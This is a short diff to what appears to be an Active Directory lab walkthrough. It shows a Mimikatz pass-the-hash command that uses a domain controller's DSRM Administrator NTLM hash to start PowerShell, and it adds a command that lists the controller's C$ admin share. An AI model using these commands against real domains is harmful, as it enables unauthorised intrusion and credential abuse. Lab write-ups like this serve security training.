@@ -490,3 +490,7 @@ Now from the attack box we can simply pas the hash and use the dsrm administrato
 ```powershell
 Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
 ```
+```powershell
+ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
+```
+
